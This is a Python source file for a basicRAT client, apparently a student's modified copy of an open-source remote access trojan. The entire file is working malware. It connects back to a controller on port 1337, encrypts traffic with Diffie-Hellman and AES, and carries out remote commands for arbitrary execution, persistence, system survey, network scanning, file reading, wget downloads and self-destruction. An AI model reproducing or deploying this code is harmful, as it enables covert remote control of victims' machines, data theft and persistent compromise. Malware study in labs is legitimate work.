"""

__author__ = "Md Mazharul Islam Rakeb"
__email__ = "mislam7@uncc.edu"
__date__ = 11/9/20

"""

# !/usr/bin/env python

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import struct
import sys
import time
import traceback

from core import *

# change these to suit your needs
from core.crypto import AESCipher

HOST = 'localhost'
# HOST = '172.20.4.69'
PORT = 1337

# seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 2

# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print('This platform is not supported.')
    sys.exit(1)

print(PLAT)


def client_loop(conn, cipher):
    encryption_flag = True
    while True:
        results = ''

        # wait to receive data from server
        # data = crypto.decrypt(conn.recv(4096), dhkey)
        data = conn.recv(4096)
        if not data:
            break
        if encryption_flag:
            data = cipher.decrypt(data)
        else:
            data = data.decode()

        # seperate data into command and action
        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'enableencrypt':
            encryption_flag = True
            continue

        elif cmd == 'disableencrypt':
            encryption_flag = False
            continue

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(PLAT)

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'persistence':
            results = persistence.run(PLAT)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(PLAT)

        elif cmd == 'cat':
            results = toolkit.cat(action)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(action)

        elif cmd == 'pwd':
            results = toolkit.pwd()

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        if not isinstance(results, str):
            results = results.decode()

        results = results.rstrip() + '\n{} completed.'.format(cmd)

        print(results)

        if encryption_flag:
            msg = cipher.encrypt(results)
        else:
            msg = results

        if encryption_flag:
            conn.send(cipher.encrypt(str(len(msg))))
            time.sleep(0.1)
            conn.send(msg)
        else:
            conn.send(int_to_bytes(len(msg)))
            time.sleep(0.1)
            conn.send(msg.encode())


def int_to_bytes(x: int) -> bytes:
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')


def main():
    exit_status = 0

    while True:
        conn = socket.socket()
        # conn.settimeout(30)
        try:
            host = sys.argv[1]
        except:
            host = HOST
        try:
            # attempt to connect to basicRAT server
            print("connect...")
            conn.connect((host, PORT))
            print("connected: {}".format(conn))
        except socket.error:
            print("am i waiting?")
            time.sleep(CONN_TIMEOUT)
            continue

        # input("wait to see how diffiehellman calling works...")
        dhkey = crypto.diffiehellman(conn)
        cipher = AESCipher(dhkey)

        # This try/except statement makes the client very resilient, but it's
        # horrible for debugging. It will keep the client alive if the server
        # is torn down unexpectedly, or if the client freaks out.
        try:
            exit_status = client_loop(conn, cipher)
        except:
            traceback.print_exc()

        if exit_status:
            sys.exit(0)


if __name__ == '__main__':
    main()
